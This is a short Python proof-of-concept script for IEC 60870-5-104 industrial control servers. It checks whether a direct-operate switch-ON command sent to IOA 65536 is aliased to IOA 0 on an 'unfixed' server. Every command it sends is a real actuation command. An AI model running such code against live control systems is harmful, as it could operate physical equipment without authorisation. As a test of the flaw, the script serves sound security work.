#!/usr/bin/env python3
import socket, struct, sys, time
HOST = sys.argv[1]; PORT = int(sys.argv[2])


def rd(s, secs):
    s.settimeout(0.3)
    end = time.time() + secs
    buf = b""
    frames = []
    while time.time() < end:
        try:
            d = s.recv(4096)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
        while len(buf) >= 2 and len(buf) >= buf[1] + 2:
            frames.append(buf[:buf[1] + 2])
            buf = buf[buf[1] + 2:]
    return frames


seen = 0  # I-frames received from the server, sent back as N(R)


def single_command(s, ioa, seq):
    """Send a direct-operate C_SC_NA_1 (ON) to ioa, return the ACT_CON negative flag (None if none)."""
    global seen
    asdu = bytes([45, 1, 6, 0, 1, 0]) + struct.pack("<I", ioa)[:3] + bytes([0x01])
    s.sendall(bytes([0x68, 4 + len(asdu)]) + struct.pack("<HH", seq << 1, seen << 1) + asdu)
    negative = None
    for f in rd(s, 2):
        if f[2] & 1 == 0:  # I-frame
            seen += 1
            if f[6] == 45 and (f[8] & 0x3f) == 7:  # ACT_CON
                negative = bool(f[8] & 0x40)
    return negative


s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(bytes([0x68, 4, 7, 0, 0, 0]))  # STARTDT act
rd(s, 1)
alias = single_command(s, 65536, 0)  # aliases IOA 0 on the unfixed server
valid = single_command(s, 0, 1)
print(f"IOA 65536 ACT_CON negative={alias}; IOA 0 ACT_CON negative={valid}")
